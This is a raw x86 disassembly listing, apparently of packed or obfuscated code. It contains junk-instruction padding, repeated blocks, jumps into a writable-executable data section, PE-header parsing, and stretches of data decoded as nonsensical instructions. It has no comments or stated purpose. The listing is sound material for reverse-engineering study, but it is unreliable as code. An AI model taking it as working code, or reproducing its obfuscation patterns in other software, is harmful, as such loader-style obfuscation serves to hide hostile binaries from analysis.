add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
sub_425eba
lea esp [ esp + 0x2c ]
je rwxdata
and esi 0xbda0ca2b
btc edi ebx
bt di 0xc
xor eax eax
bts si si
dec si
push eax
cmp esi 0x12cdcd1e
add edi ebx
cmc
inc si
pop esi
xor si sp
mov esi [ edx ]
stc
test esi esi
call sub_42597b
mov [ ecx ] 0xdf
outsb
push 0x6c646e61
inc ebp
js rwxdata
and al 0x8d
and al 0x24
call sub_422e71
pushad
call sub_42250b
btc si cx
jo rwxdata
cmp bl [ esi - 0x26 ]
out dx al
cmp cl [ esi + 0xa ]
push es
xor [ eax + 0x10773f63 ] esp
jb rwxdata
mov esi edi
test edi 0x5702cfeb
bt edx edx
sub esi eax
call sub_42698c
add [ eax ] al
inc edi
je rwxdata
imul ebp [ edi + 0x6e ] 0x746c6946
jb rwxdata
cmp [ edx - 0x5611ed6a ] edi
stosb [ edi ]
cvttsd2si esi [ cs : ebx - 0x7028eb6d ]
stosd [ edi ]
push es
mov al [ 0x10773f63 ]
sbb al 0x8c
int3
in al 0x3f
scasd [ edi ]
les ebp [ eax + esi * 4 + 0x540c1b6f ]
jo rwxdata
imul ebp [ edi + 0x6e ] rw-data
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
pushfd
cmc
test eax eax
pushad
lea esp [ esp + 0x24 ]
jno rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lea esp [ esp + 0x8 ]
jo rwxdata
pushad
mov eax 0x1
pushad
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
call sub_4269b4
add [ eax ] al
dec eax
popad
jo rwxdata
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
jmp rwxdata
je rwxdata
xchg si bx
bswap bx
pop ebx
pushad
mov edi [ esp + 0x20 ]
push [ esp + 0x4 ]
pop esi
mov esi [ esp + 0x24 ]
call sub_425a01
add [ eax ] al
push ebx
je rwxdata
mov ebx 0x42
add [ edi + 0x65 ] al
je rwxdata
inc ecx
insb
insb
outsd
arpl [ eax ] ax
push ecx
lea esp [ esp + 0x4 ]
je rwxdata
call sub_421e6d
or si dx
bsr si bx
mov esi [ edx ]
cmc
pushad
call sub_422fd4
movzx esi bl
clc
rol si cl
add edi ebx
cmc
cmp ah bl
jmp rwxdata
pushfd
add [ ebp - 0x4 ] 0x14
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
pushfd
pushfd
test eax 0x80000000
pushfd
pushad
mov [ esp + 0x4 ] 0x5197
mov [ esp ] cx
lea esp [ esp + 0x2c ]
je rwxdata
push 0xd2332ef5
mov [ ebp - 0x8 ] eax
sbb eax esp
aas
clc
mov eax [ esi ]
cmc
test eax eax
push 0x15da7c7
mov [ esp + 0x4 ] 0x40
push [ esp ]
jmp rwxdata
sub di si
sbb dl al
mov edx [ ebp - 0x4 ]
sar di 0xa
dec di
movsx di cl
sbb di 0xa30b
mov edi [ edx + 0x10 ]
pushfd
jmp rwxdata
test si 0x53a9
call sub_42526f
test cx 0xce0b
test esi esi
call sub_426c34
pushfd
jmp rwxdata
lea esp [ esp + 0xc ]
je rwxdata
bt di dx
bt sp 0xf
test edi edi
pushfd
jmp rwxdata
and eax 0xffff
mov [ esp ] dx
mov [ esp ] dh
lea esp [ esp + 0x4 ]
jmp rwxdata
lea esp [ esp + 0x8 ]
je rwxdata
pushfd
pushfd
xchg [ esp + 0x4 ] eax
pop eax
cwde
push [ ebp - 0x8 ]
setle ah
lea eax [ 0x0 ]
pushad
mov [ esp + 0x1c ] rwxdata
pushfd
jmp rwxdata
mov [ esp + 0x1c ] eax
pushfd
pushad
pushfd
pushfd
push [ esp + 0x48 ]
retn 0x4c
sub_425ee6
pushfd
mov bl 0x2
inc al
inc ecx
call sub_426c50
test cx ax
cmc
stc
test edi edi
pushad
lea esp [ esp + 0x28 ]
je rwxdata
and esi 0xbda0ca2b
btc edi ebx
bt di 0xc
xor eax eax
bswap si
shrd si ax cl
add edi ebx
dec si
cmp dh 0x6a
rol esi cl
mov esi [ edx ]
bt bp sp
jmp rwxdata
mov [ ecx ] 0xdf
outsb
push 0x6c646e61
inc ebp
js rwxdata
test cx 0xce0b
test esi esi
call sub_426c34
and al 0x8d
and al 0x24
call sub_422e71
pushad
call sub_42250b
btc si cx
jo rwxdata
cmp bl [ esi - 0x26 ]
out dx al
cmp cl [ esi + 0xa ]
push es
xor [ eax + 0x10773f63 ] esp
jb rwxdata
mov esi edi
test edi 0x5702cfeb
bt edx edx
sub esi eax
call sub_42698c
add [ eax ] al
inc edi
je rwxdata
imul ebp [ edi + 0x6e ] 0x746c6946
jb rwxdata
cmp [ edx - 0x5611ed6a ] edi
stosb [ edi ]
cvttsd2si esi [ cs : ebx - 0x7028eb6d ]
stosd [ edi ]
push es
mov al [ 0x10773f63 ]
sbb al 0x8c
int3
in al 0x3f
scasd [ edi ]
les ebp [ eax + esi * 4 + 0x540c1b6f ]
jo rwxdata
imul ebp [ edi + 0x6e ] rw-data
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
pushfd
cmc
test eax eax
pushad
lea esp [ esp + 0x24 ]
jno rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lea esp [ esp + 0x8 ]
jo rwxdata
pushad
mov eax 0x1
pushad
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
call sub_4269b4
add [ eax ] al
dec eax
popad
jo rwxdata
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
jmp rwxdata
je rwxdata
xchg si bx
bswap bx
pop ebx
pushad
mov edi [ esp + 0x20 ]
push [ esp + 0x4 ]
pop esi
mov esi [ esp + 0x24 ]
call sub_425a01
add [ eax ] al
push ebx
je rwxdata
mov ebx 0x42
add [ edi + 0x65 ] al
je rwxdata
inc ecx
insb
insb
outsd
arpl [ eax ] ax
push ecx
lea esp [ esp + 0x4 ]
je rwxdata
call sub_421e6d
or si dx
bsr si bx
mov esi [ edx ]
cmc
pushad
call sub_422fd4
movzx esi bl
clc
rol si cl
add edi ebx
cmc
cmp ah bl
jmp rwxdata
pushfd
add [ ebp - 0x4 ] 0x14
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
pushfd
pushfd
test eax 0x80000000
pushfd
pushad
mov [ esp + 0x4 ] 0x5197
mov [ esp ] cx
lea esp [ esp + 0x2c ]
je rwxdata
push 0xd2332ef5
mov [ ebp - 0x8 ] eax
sbb eax esp
aas
clc
mov eax [ esi ]
cmc
test eax eax
push 0x15da7c7
mov [ esp + 0x4 ] 0x40
push [ esp ]
jmp rwxdata
sub di si
sbb dl al
mov edx [ ebp - 0x4 ]
sar di 0xa
dec di
movsx di cl
sbb di 0xa30b
mov edi [ edx + 0x10 ]
pushfd
jmp rwxdata
test si 0x53a9
call sub_42526f
pushfd
jmp rwxdata
lea esp [ esp + 0xc ]
je rwxdata
bt di dx
bt sp 0xf
test edi edi
pushfd
jmp rwxdata
and eax 0xffff
mov [ esp ] dx
mov [ esp ] dh
lea esp [ esp + 0x4 ]
jmp rwxdata
lea esp [ esp + 0x8 ]
je rwxdata
pushfd
pushfd
xchg [ esp + 0x4 ] eax
pop eax
cwde
push [ ebp - 0x8 ]
setle ah
lea eax [ 0x0 ]
pushad
mov [ esp + 0x1c ] rwxdata
pushfd
jmp rwxdata
mov [ esp + 0x1c ] eax
pushfd
pushad
pushfd
pushfd
push [ esp + 0x48 ]
retn 0x4c
sub_425fbe
push 0x95796f3f
lea esp [ esp + 0xc ]
je rwxdata
and esi 0xbda0ca2b
btc edi ebx
bt di 0xc
xor eax eax
sub bl 0xfd
ror dx cl
mov ebx eax
shr dx cl
btc edx 0x16
mov edx [ ebx + 0x3c ]
cmp dx dx
clc
pushad
pushad
add edx ebx
pushfd
stc
pushfd
cmp dl 0xaa
mov edx [ edx + 0x80 ]
push [ esp + 0x8 ]
bt ecx 0x1e
test edx edx
call sub_4208e6
pushfd
mov [ esp ] rwxdata
pushad
pushad
mov [ esp ] edi
mov [ esp + 0x3c ] eax
pushfd
push edx
push [ esp + 0x44 ]
retn 0x48
mov [ ecx ] 0xdf
outsb
push 0x6c646e61
inc ebp
js rwxdata
and al 0x8d
and al 0x24
call sub_422e71
pushad
call sub_42250b
btc si cx
jo rwxdata
cmp bl [ esi - 0x26 ]
out dx al
cmp cl [ esi + 0xa ]
push es
xor [ eax + 0x10773f63 ] esp
jb rwxdata
mov esi edi
test edi 0x5702cfeb
bt edx edx
sub esi eax
call sub_42698c
add [ eax ] al
inc edi
je rwxdata
imul ebp [ edi + 0x6e ] 0x746c6946
jb rwxdata
cmp [ edx - 0x5611ed6a ] edi
stosb [ edi ]
cvttsd2si esi [ cs : ebx - 0x7028eb6d ]
stosd [ edi ]
push es
mov al [ 0x10773f63 ]
sbb al 0x8c
int3
in al 0x3f
scasd [ edi ]
les ebp [ eax + esi * 4 + 0x540c1b6f ]
jo rwxdata
imul ebp [ edi + 0x6e ] rw-data
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
pushfd
cmc
test eax eax
pushad
lea esp [ esp + 0x24 ]
jno rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lea esp [ esp + 0x8 ]
jo rwxdata
pushad
mov eax 0x1
pushad
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
call sub_4269b4
add [ eax ] al
dec eax
popad
jo rwxdata
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
jmp rwxdata
je rwxdata
xchg si bx
bswap bx
pop ebx
pushad
mov edi [ esp + 0x20 ]
push [ esp + 0x4 ]
pop esi
mov esi [ esp + 0x24 ]
call sub_425a01
add [ eax ] al
push ebx
je rwxdata
mov ebx 0x42
add [ edi + 0x65 ] al
je rwxdata
inc ecx
insb
insb
outsd
arpl [ eax ] ax
push ecx
lea esp [ esp + 0x4 ]
je rwxdata
call sub_421e6d
or si dx
bsr si bx
mov esi [ edx ]
cmc
pushad
call sub_422fd4
movzx esi bl
clc
rol si cl
add edi ebx
cmc
cmp ah bl
jmp rwxdata
pushfd
add [ ebp - 0x4 ] 0x14
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
pushfd
pushfd
test eax 0x80000000
pushfd
pushad
mov [ esp + 0x4 ] 0x5197
mov [ esp ] cx
lea esp [ esp + 0x2c ]
je rwxdata
push 0xd2332ef5
mov [ ebp - 0x8 ] eax
sbb eax esp
aas
clc
mov eax [ esi ]
cmc
test eax eax
push 0x15da7c7
mov [ esp + 0x4 ] 0x40
push [ esp ]
jmp rwxdata
sub di si
sbb dl al
mov edx [ ebp - 0x4 ]
sar di 0xa
dec di
movsx di cl
sbb di 0xa30b
mov edi [ edx + 0x10 ]
pushfd
jmp rwxdata
test si 0x53a9
call sub_42526f
test cx 0xce0b
test esi esi
call sub_426c34
pushfd
jmp rwxdata
lea esp [ esp + 0xc ]
je rwxdata
bt di dx
bt sp 0xf
test edi edi
pushfd
jmp rwxdata
and eax 0xffff
mov [ esp ] dx
mov [ esp ] dh
lea esp [ esp + 0x4 ]
jmp rwxdata
lea esp [ esp + 0x8 ]
je rwxdata
pushfd
pushfd
xchg [ esp + 0x4 ] eax
pop eax
cwde
push [ ebp - 0x8 ]
setle ah
lea eax [ 0x0 ]
pushad
mov [ esp + 0x1c ] rwxdata
pushfd
jmp rwxdata
mov [ esp + 0x1c ] eax
pushfd
pushad
pushfd
pushfd
push [ esp + 0x48 ]
retn 0x4c
sub_42633a
stc
test edx edx
pushfd
lea esp [ esp + 0x8 ]
je rwxdata
and esi 0xbda0ca2b
btc edi ebx
bt di 0xc
xor eax eax
push 0x90ee2d85
rcr di 0x9
not di
add edx ebx
stc
clc
shld di dx cl
movzx di cl
mov [ ebp - 0x4 ] edx
shl di cl
neg di
mov edx [ ebp - 0x4 ]
bt si 0xf
pushfd
mov edi [ edx + 0x10 ]
pushad
call sub_422fa0
add [ eax ] al
push edx
inc ebx
jb rwxdata
mov [ ecx ] 0xdf
outsb
push 0x6c646e61
inc ebp
js rwxdata
cmc
cmp ah bl
popad
je rwxdata
and al 0x8d
and al 0x24
call sub_422e71
pushad
call sub_42250b
btc si cx
jo rwxdata
push 0xd2332ef5
mov [ ebp - 0x8 ] eax
sbb eax esp
aas
clc
mov eax [ esi ]
cmc
test eax eax
push 0x15da7c7
mov [ esp + 0x4 ] 0x40
push [ esp ]
jmp rwxdata
jmp rwxdata
dec ebx
jns rwxdata
cmp bl [ esi - 0x26 ]
out dx al
cmp cl [ esi + 0xa ]
push es
xor [ eax + 0x10773f63 ] esp
jb rwxdata
mov esi edi
test edi 0x5702cfeb
bt edx edx
sub esi eax
call sub_42698c
add [ eax ] al
inc edi
je rwxdata
imul ebp [ edi + 0x6e ] 0x746c6946
jb rwxdata
lea esp [ esp + 0xc ]
je rwxdata
js rwxdata
cmp [ edx - 0x5611ed6a ] edi
stosb [ edi ]
cvttsd2si esi [ cs : ebx - 0x7028eb6d ]
stosd [ edi ]
push es
mov al [ 0x10773f63 ]
sbb al 0x8c
int3
in al 0x3f
scasd [ edi ]
les ebp [ eax + esi * 4 + 0x540c1b6f ]
jo rwxdata
imul ebp [ edi + 0x6e ] rw-data
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
pushfd
cmc
test eax eax
pushad
lea esp [ esp + 0x24 ]
jno rwxdata
pushfd
add [ ebp - 0x4 ] 0x14
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
pushfd
pushfd
test eax 0x80000000
pushfd
pushad
mov [ esp + 0x4 ] 0x5197
mov [ esp ] cx
lea esp [ esp + 0x2c ]
je rwxdata
sub ecx 0xfffff08f
bt bx bp
stc
call sub_42633a
add cl bh
sub esp 0xffffffdc
jle rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
je rwxdata
sub di si
sbb dl al
mov edx [ ebp - 0x4 ]
sar di 0xa
dec di
movsx di cl
sbb di 0xa30b
mov edi [ edx + 0x10 ]
pushfd
jmp rwxdata
test si 0x53a9
call sub_42526f
test cx 0xce0b
test esi esi
call sub_426c34
pushfd
jmp rwxdata
pushad
mov eax 0x1
pushad
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
cmc
push ebx
pushfd
call sub_4201cb
push edi
xchg [ esp ] eax
push esi
lea eax [ 0x0 ]
lea esp [ esp + 0x4 ]
jb rwxdata
push ebx
test ebp edi
pushad
test eax eax
pushfd
mov [ esp + 0xc ] ah
push 0x767ed671
mov [ esp ] 0x41a9
lea esp [ esp + 0x28 ]
je rwxdata
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lea esp [ esp + 0x8 ]
jo rwxdata
call sub_4269b4
add [ eax ] al
dec eax
popad
jo rwxdata
bt di dx
bt sp 0xf
test edi edi
pushfd
jmp rwxdata
and eax 0xffff
mov [ esp ] dx
mov [ esp ] dh
lea esp [ esp + 0x4 ]
jmp rwxdata
xchg si bx
bswap bx
pop ebx
pushad
mov edi [ esp + 0x20 ]
push [ esp + 0x4 ]
pop esi
mov esi [ esp + 0x24 ]
call sub_425a01
add [ eax ] al
push ebx
je rwxdata
pushfd
mov [ esp ] rwxdata
pushad
pushad
mov [ esp ] edi
mov [ esp + 0x3c ] eax
pushfd
push edx
push [ esp + 0x44 ]
retn 0x48
pushad
mov [ esp + 0x4 ] 0x3bc1
mov [ esp + 0x1c ] rwxdata
pushfd
mov [ esp + 0x1c ] eax
pushfd
push [ esp + 0x20 ]
retn 0x24
inc bx
bts dx 0x9
ror bh 0x6
movzx dx dl
mov ebx eax
lea edx [ ecx - 0x7e759d28 ]
jmp rwxdata
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
jmp rwxdata
je rwxdata
mov ebx 0x42
add [ edi + 0x65 ] al
je rwxdata
inc ecx
insb
insb
outsd
arpl [ eax ] ax
lea esp [ esp + 0x8 ]
je rwxdata
pushfd
pushfd
xchg [ esp + 0x4 ] eax
pop eax
cwde
push [ ebp - 0x8 ]
setle ah
lea eax [ 0x0 ]
pushad
mov [ esp + 0x1c ] rwxdata
pushfd
jmp rwxdata
pushfd
clc
mov edx [ ebx + 0x3c ]
call sub_425165
pushad
push [ esp + 0x8 ]
pushfd
jmp sub_4314fe
push ecx
lea esp [ esp + 0x4 ]
je rwxdata
call sub_421e6d
or si dx
bsr si bx
mov esi [ edx ]
cmc
pushad
call sub_422fd4
movzx esi bl
clc
rol si cl
add edi ebx
mov [ esp + 0x1c ] eax
pushfd
pushad
pushfd
pushfd
push [ esp + 0x48 ]
retn 0x4c
sub_42638d
stc
sub esp 0xffffffdc
jle rwxdata
cmc
push ebx
pushfd
call sub_4201cb
push edi
xchg [ esp ] eax
push esi
lea eax [ 0x0 ]
lea esp [ esp + 0x4 ]
jb rwxdata
push ebx
test ebp edi
pushad
test eax eax
pushfd
mov [ esp + 0xc ] ah
push 0x767ed671
mov [ esp ] 0x41a9
lea esp [ esp + 0x28 ]
je rwxdata
pushfd
mov [ esp ] rwxdata
pushad
pushad
mov [ esp ] edi
mov [ esp + 0x3c ] eax
pushfd
push edx
push [ esp + 0x44 ]
retn 0x48
pushad
mov [ esp + 0x4 ] 0x3bc1
mov [ esp + 0x1c ] rwxdata
pushfd
mov [ esp + 0x1c ] eax
pushfd
push [ esp + 0x20 ]
retn 0x24
and esi 0xbda0ca2b
btc edi ebx
bt di 0xc
xor eax eax
inc bx
bts dx 0x9
ror bh 0x6
movzx dx dl
mov ebx eax
lea edx [ ecx - 0x7e759d28 ]
jmp rwxdata
mov [ ecx ] 0xdf
outsb
push 0x6c646e61
inc ebp
js rwxdata
pushfd
clc
mov edx [ ebx + 0x3c ]
call sub_425165
pushad
push [ esp + 0x8 ]
pushfd
jmp sub_4314fe
and al 0x8d
and al 0x24
call sub_422e71
pushad
call sub_42250b
btc si cx
jo rwxdata
cmp bl [ esi - 0x26 ]
out dx al
cmp cl [ esi + 0xa ]
push es
xor [ eax + 0x10773f63 ] esp
jb rwxdata
mov esi edi
test edi 0x5702cfeb
bt edx edx
sub esi eax
call sub_42698c
add [ eax ] al
inc edi
je rwxdata
imul ebp [ edi + 0x6e ] 0x746c6946
jb rwxdata
cmp [ edx - 0x5611ed6a ] edi
stosb [ edi ]
cvttsd2si esi [ cs : ebx - 0x7028eb6d ]
stosd [ edi ]
push es
mov al [ 0x10773f63 ]
sbb al 0x8c
int3
in al 0x3f
scasd [ edi ]
les ebp [ eax + esi * 4 + 0x540c1b6f ]
jo rwxdata
imul ebp [ edi + 0x6e ] rw-data
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
pushfd
cmc
test eax eax
pushad
lea esp [ esp + 0x24 ]
jno rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lea esp [ esp + 0x8 ]
jo rwxdata
pushad
mov eax 0x1
pushad
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
call sub_4269b4
add [ eax ] al
dec eax
popad
jo rwxdata
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
jmp rwxdata
je rwxdata
xchg si bx
bswap bx
pop ebx
pushad
mov edi [ esp + 0x20 ]
push [ esp + 0x4 ]
pop esi
mov esi [ esp + 0x24 ]
call sub_425a01
add [ eax ] al
push ebx
je rwxdata
mov ebx 0x42
add [ edi + 0x65 ] al
je rwxdata
inc ecx
insb
insb
outsd
arpl [ eax ] ax
push ecx
lea esp [ esp + 0x4 ]
je rwxdata
call sub_421e6d
or si dx
bsr si bx
mov esi [ edx ]
cmc
pushad
call sub_422fd4
movzx esi bl
clc
rol si cl
add edi ebx
cmc
cmp ah bl
jmp rwxdata
pushfd
add [ ebp - 0x4 ] 0x14
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
pushfd
pushfd
test eax 0x80000000
pushfd
pushad
mov [ esp + 0x4 ] 0x5197
mov [ esp ] cx
lea esp [ esp + 0x2c ]
je rwxdata
push 0xd2332ef5
mov [ ebp - 0x8 ] eax
sbb eax esp
aas
clc
mov eax [ esi ]
cmc
test eax eax
push 0x15da7c7
mov [ esp + 0x4 ] 0x40
push [ esp ]
jmp rwxdata
sub di si
sbb dl al
mov edx [ ebp - 0x4 ]
sar di 0xa
dec di
movsx di cl
sbb di 0xa30b
mov edi [ edx + 0x10 ]
pushfd
jmp rwxdata
test si 0x53a9
call sub_42526f
test cx 0xce0b
test esi esi
call sub_426c34
pushfd
jmp rwxdata
lea esp [ esp + 0xc ]
je rwxdata
bt di dx
bt sp 0xf
test edi edi
pushfd
jmp rwxdata
and eax 0xffff
mov [ esp ] dx
mov [ esp ] dh
lea esp [ esp + 0x4 ]
jmp rwxdata
lea esp [ esp + 0x8 ]
je rwxdata
pushfd
pushfd
xchg [ esp + 0x4 ] eax
pop eax
cwde
push [ ebp - 0x8 ]
setle ah
lea eax [ 0x0 ]
pushad
mov [ esp + 0x1c ] rwxdata
pushfd
jmp rwxdata
mov [ esp + 0x1c ] eax
pushfd
pushad
pushfd
pushfd
push [ esp + 0x48 ]
retn 0x4c
sub_4265f4
push esi
rol dl 0x3
pushfd
jmp rwxdata
push [ esp + 0x42 ]
popf
pushfd
lea esp [ esp + 0x48 ]
jo rwxdata
jmp rwxdata
inc esi
jmp rwxdata
pushad
mov [ esp ] dh
pushfd
inc esi
pushfd
pushfd
call sub_4250b7
add [ eax ] al
dec eax
je rwxdata
pushfd
mov [ esp ] 0x859e
call sub_422e55
call [ eax ]
ror [ ebp + 0x68082464 ] cl
or ecx [ ebp - 0x61 ]
jo rwxdata
and al 0x66
cmp esp esi
jo rwxdata
or [ edi ] cl
test [ esi + edi ] ch
add [ eax ] al
call sub_4208c7
outsb
push edx
jno rwxdata
shr al cl
insd
sar edi cl
[ eax - 0x26 ]
lahf
jae rwxdata
call sub_4201d2
push 0x6af9aeda
call j_sub_432345
push edi
add bh bh
xor al 0x24
push esi
pushad
lea esp [ esp + 0x34 ]
ja rwxdata
rcl si cl
mov esi edi
push 0x86cbe573
sub esi eax
jmp j_sub_422ee4
or bl 0xfc
xchg ebp eax
shld ax bp 0x8
stc
mov eax ebp
shr bl cl
dec bl
pushad
mov bl 0x1
sub esp 0xffffffe0
test si sp
bt ax di
push 0x4c9718b0
xchg [ esp ] esi
cmp sp si
not bl
dec bl
push ebx
push [ esp ]
inc ecx
lea esp [ esp + 0x8 ]
inc bl
inc ecx
sub_426633
inc bl
inc ecx
fidivr [ ecx - 0x1b3fdf7e ]
add [ esp + esi * 2 + 0x68 ] 0x4
pop eax
jg rwxdata
push 0x5074726f
popad
je rwxdata
call sub_425307
add [ eax ] al
inc edi
je rwxdata
push cs
cmp esi 0xffffffcb
call sub_42294b
dec esi
popad
insd
inc ecx
add [ eax - 0x48 ] ah
add [ eax ] eax
add [ eax ] al
xchg si bx
bswap bx
pop ebx
pushad
mov edi [ esp + 0x20 ]
push [ esp + 0x4 ]
pop esi
mov esi [ esp + 0x24 ]
call sub_425a01
add [ eax ] al
push ebx
je rwxdata
mov [ ecx ] 0xdf
outsb
push 0x6c646e61
inc ebp
js rwxdata
and al 0x8d
and al 0x24
call sub_422e71
pushad
call sub_42250b
btc si cx
jo rwxdata
cmp bl [ esi - 0x26 ]
out dx al
cmp cl [ esi + 0xa ]
push es
xor [ eax + 0x10773f63 ] esp
jb rwxdata
mov esi edi
test edi 0x5702cfeb
bt edx edx
sub esi eax
call sub_42698c
add [ eax ] al
inc edi
je rwxdata
imul ebp [ edi + 0x6e ] 0x746c6946
jb rwxdata
cmp [ edx - 0x5611ed6a ] edi
stosb [ edi ]
cvttsd2si esi [ cs : ebx - 0x7028eb6d ]
stosd [ edi ]
push es
mov al [ 0x10773f63 ]
sbb al 0x8c
int3
in al 0x3f
scasd [ edi ]
les ebp [ eax + esi * 4 + 0x540c1b6f ]
jo rwxdata
imul ebp [ edi + 0x6e ] rw-data
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
